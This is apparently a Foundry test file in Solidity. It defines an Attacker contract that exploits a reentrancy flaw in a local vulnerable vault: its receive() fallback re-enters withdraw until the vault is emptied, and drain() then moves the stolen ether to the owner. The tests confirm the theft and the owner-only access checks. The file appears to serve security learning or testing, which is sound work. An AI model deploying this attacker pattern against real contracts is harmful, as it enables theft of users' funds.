// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {TestV1} from "../src/vulnerableVault.sol";
import {console} from "forge-std/console.sol";

contract Attacker {
    TestV1 private testv1;
    uint256 public attackAmount;
    address owner;

    constructor(TestV1 _testV1){
        testv1 = _testV1;
        owner = msg.sender;
    }

    modifier OnlyOwner{
        require(owner == msg.sender, "Only owner can call function");
        _;
    }
    
    function attack() external payable OnlyOwner{
        require(msg.value > 0, "must send eth");

        attackAmount = msg.value;
        testv1.deposit{value: msg.value}();
        testv1.withdraw(msg.value);
    }

    function drain() external payable OnlyOwner{
        uint256 amount = address(this).balance;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer");
    }


    receive() external payable{
        if (address(testv1).balance >= attackAmount) {
            testv1.withdraw(attackAmount);
        }
    }
}


contract CounterTest is Test {
    TestV1 public testv1;
    Attacker public attacker;
    address user;
    address owner = makeAddr("owner");

    function setUp() public {
        testv1 = new TestV1();
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        attacker = new Attacker(testv1);

        user = makeAddr("user");

        vm.deal(user, 4 ether);
        vm.deal(address(attacker), 4 ether);
        vm.deal(address(testv1), 5 ether);

    }

    function test_withdraw() public{
        vm.startPrank(user);
        uint256 attackerBalanceBefore = user.balance;
        uint256 contractBalanceBefore = address(testv1).balance;
        assertEq(attackerBalanceBefore, 4 ether);
        assertEq(contractBalanceBefore, 5 ether);

        testv1.deposit{value: 3 ether}();
        uint256 attackerBalanceAfter = user.balance;
        uint256 contractBalanceAfter = address(testv1).balance;
        assertEq(attackerBalanceAfter, 1 ether);
        assertEq(contractBalanceAfter, 8 ether);

        testv1.withdraw(3 ether);
        uint256 attackerBalanceAfterWithdraw = user.balance;
        uint256 contractBalanceAfterWithdraw = address(testv1).balance;
        assertEq(attackerBalanceAfterWithdraw, 4 ether);
        assertEq(contractBalanceAfterWithdraw, 5 ether);
        vm.stopPrank();
    }
    
    function test_unathorized_access_to_attack() public {
        vm.startPrank(user);
        uint256 userBalanceBeforeAttack = user.balance;
        uint256 attackContractBalanceBeforeAttack = address(attacker).balance;
        uint256 contractBalanceBeforeAttack = address(testv1).balance;
        assertEq(userBalanceBeforeAttack, 4 ether);
        assertEq(attackContractBalanceBeforeAttack, 4 ether);
        assertEq(contractBalanceBeforeAttack, 5 ether);

        vm.expectRevert();
        attacker.attack{value: 1 ether}();

        uint256 userBalanceAfterAttack = user.balance;
        uint256 attackerContractBalanceAfterAttack = address(attacker).balance;
        uint256 contractBalanceAfterAttack = address(testv1).balance;
        //// Since calling the attack() function reverts because of unauthorised access, no change of balance 
        /// for the user calling  the function, the attacker contract, and the vulnerable contract.
        assertEq(userBalanceAfterAttack, 4 ether);
        assertEq(attackerContractBalanceAfterAttack, 4 ether);
        assertEq(contractBalanceAfterAttack, 5 ether);
        vm.stopPrank();
    }

    function test_only_owner_attack() public{
        vm.startPrank(owner);
        uint256 ownerBalanceBeforeAttack = owner.balance;
        uint256 attackerBalanceBeforeAttack = address(attacker).balance;
        uint256 contractBalanceBeforeAttack = address(testv1).balance;
        assertEq(ownerBalanceBeforeAttack, 1 ether);
        assertEq(attackerBalanceBeforeAttack, 4 ether);
        assertEq(contractBalanceBeforeAttack, 5 ether);

        attacker.attack{value: 1 ether}();

        uint256 ownerBalanceAfterAttack = owner.balance;
        uint256 attackerBalanceAfterAttack = address(attacker).balance;
        uint256 contractBalanceAfterAttack = address(testv1).balance;
        //// Initially, the owner had 1 eth, but after calling the attack function, he deposited the 1 eth and now has 0 eth as his balance.
        // Even though he's the owner of the attacker contract, he didn't get the eth that was stolen from the vulnerable contract, the stolen
        // eth is still in the attacker contract vault.
        assertEq(ownerBalanceAfterAttack, 0 ether);
        assertEq(attackerBalanceAfterAttack, 10 ether);
        assertEq(contractBalanceAfterAttack, 0 ether);
        vm.stopPrank();
    }

    function test_unauthorised_access_to_drain() public {
        vm.startPrank(owner);
        uint256 userInitialBalance = user.balance; // User's balane
        assertEq(userInitialBalance, 4 ether);

        uint256 ownerBalanceBeforeAttack = owner.balance;
        uint256 attackerBalanceBeforeAttack = address(attacker).balance;
        uint256 contractBalanceBeforeAttack = address(testv1).balance;
        assertEq(ownerBalanceBeforeAttack, 1 ether);
        assertEq(attackerBalanceBeforeAttack, 4 ether);
        assertEq(contractBalanceBeforeAttack, 5 ether);

        attacker.attack{value: 1 ether}();

        uint256 ownerBalanceAfterAttack = owner.balance;
        uint256 attackerBalanceAfterAttack = address(attacker).balance;
        uint256 contractBalanceAfterAttack = address(testv1).balance;
        assertEq(ownerBalanceAfterAttack, 0 ether);
        assertEq(attackerBalanceAfterAttack, 10 ether);
        assertEq(contractBalanceAfterAttack, 0 ether);
        vm.stopPrank();

        vm.startPrank(user);
        vm.expectRevert();
        attacker.drain();
        uint256 userBalanceAfterDrain = user.balance;
        assertEq(userBalanceAfterDrain, 4 ether);
    }

    function test_only_owner_can_drain_contract() public {
        vm.startPrank(owner);
        uint256 ownerBalanceBeforeAttack = owner.balance;
        uint256 attackerBalanceBeforeAttack = address(attacker).balance;
        uint256 contractBalanceBeforeAttack = address(testv1).balance;
        assertEq(ownerBalanceBeforeAttack, 1 ether);
        assertEq(attackerBalanceBeforeAttack, 4 ether);
        assertEq(contractBalanceBeforeAttack, 5 ether);

        attacker.attack{value: 1 ether}();

        uint256 ownerBalanceAfterAttack = owner.balance;
        uint256 attackerBalanceAfterAttack = address(attacker).balance;
        uint256 contractBalanceAfterAttack = address(testv1).balance;
        assertEq(ownerBalanceAfterAttack, 0 ether);
        assertEq(attackerBalanceAfterAttack, 10 ether);
        assertEq(contractBalanceAfterAttack, 0 ether);

        // Owner drains `attacker` contract
        attacker.drain();
        uint256 ownerBalanceAfterDrain = owner.balance;
        uint256 attackerBalanceAfterDrain = address(attacker).balance;
        assertEq(ownerBalanceAfterDrain, 10 ether);
        assertEq(attackerBalanceAfterDrain, 0);
        vm.stopPrank();
    }
}
